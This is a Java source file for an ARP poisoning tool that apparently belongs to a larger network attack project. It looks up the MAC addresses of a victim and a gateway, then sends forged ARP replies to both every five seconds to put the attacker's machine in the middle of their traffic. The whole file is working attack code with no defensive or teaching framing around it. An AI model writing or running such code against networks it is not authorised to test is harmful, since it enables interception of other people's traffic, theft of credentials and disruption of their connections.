package io.github.danielthedev.gwidt;

import org.pcap4j.packet.Packet;
import org.pcap4j.util.MacAddress;

import java.util.concurrent.atomic.AtomicReference;

import java.util.Timer;
import java.util.TimerTask;


public class ArpPoisoner {
    private final static int SEND_INTERVAL_MILLIS = 5000;

    /**
     * Runner for ARP poisoning attack
     *
     * @param input CLI input parameters
     */
    public static void ARPPoisoningAttack(CLI.Input input) {
        new Thread(() -> {
            String hostIp = input.getHostIP();
            MacAddress hostMac = MacAddress.getByName(input.getHostMac());
            String victimIp = input.getVictimIP();
            String gatewayIp = input.getGatewayIP();
            arpPoison(hostIp, hostMac, gatewayIp, victimIp);
        }).start();
    }

    /**
     * Performs ARP Poisoning attack
     *
     * @param attackerIp  attacker IP
     * @param attackerMac attacker MAC
     * @param gatewayIp   gateway IP
     * @param victimIp    victim IP
     */
    public static void arpPoison(String attackerIp, MacAddress attackerMac, String gatewayIp, String victimIp) {
        System.out.println("Fetching MAC addresses");
        MacAddress gatewayMac = getMacAddress(attackerIp, attackerMac, gatewayIp);
        MacAddress victimMac = getMacAddress(attackerIp, attackerMac, victimIp);

        if (gatewayMac == null || victimMac == null) {
            System.out.println("Failed to fetch MAC");
            System.exit(0);
        }

        new Timer().schedule(new TimerTask() {
            @Override
            public void run() {
                runUnsafe(() -> sendPoisonedPackets(attackerMac, victimIp, victimMac, gatewayIp, gatewayMac));
            }
        }, 0, SEND_INTERVAL_MILLIS);
    }

    /**
     * Fetch MAC address of IP
     *
     * @param sourceIp  source IP
     * @param sourceMac source MAC
     * @param destIp    destination IP
     * @return MAC address of destination IP
     */
    public static synchronized MacAddress getMacAddress(String sourceIp, MacAddress sourceMac, String destIp) {
        Packet packetOut = PacketFactory.createARPRequestPacket(sourceMac, sourceIp, destIp);
        AtomicReference<MacAddress> macAddress = new AtomicReference<>();
        Object LOCK = new Object();

        NetworkExecutor.getInstance().ARP_INTERFACE.setPacketListener(packets -> {
            if (packets.getB().getHeader().getSrcProtocolAddr().getHostAddress().equals(destIp)) {
                macAddress.set(packets.getB().getHeader().getSrcHardwareAddr());
                synchronized (LOCK) {
                    LOCK.notify();
                }
            }
        });
        NetworkExecutor.getInstance().ARP_INTERFACE.sendPacket(packetOut);
        synchronized (LOCK) {
            try {
                LOCK.wait(5000);
            } catch (InterruptedException ignored) {
            }
        }
        return macAddress.get();
    }

    /**
     * Poison ARP cache of victim and gateway by sending poisoned ARP packets
     *
     * @param attackerMac MAC address of attacker
     * @param victimIp    IP address of victim
     * @param victimMac   MAC address of victim
     * @param gatewayIp   IP address of gateway
     * @param gatewayMac  MAC address of gateway
     */
    private static void sendPoisonedPackets(MacAddress attackerMac, String victimIp, MacAddress victimMac, String gatewayIp, MacAddress gatewayMac) {
        System.out.println("Sending poisoned ARP packets");
        Packet victimPacket = PacketFactory.createARPReplyPacket(attackerMac, gatewayIp, victimIp, victimMac); // poison victim
        Packet gatewayPacket = PacketFactory.createARPReplyPacket(attackerMac, victimIp, gatewayIp, gatewayMac); // poison gateway
        NetworkExecutor.getInstance().ARP_INTERFACE.sendPacket(victimPacket);
        NetworkExecutor.getInstance().ARP_INTERFACE.sendPacket(gatewayPacket);
    }

    /**
     * Run "unsafe" code
     *
     * @param runnable unsafe code
     */
    public static void runUnsafe(UnsafeRunnable runnable) {
        try {
            runnable.run();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}

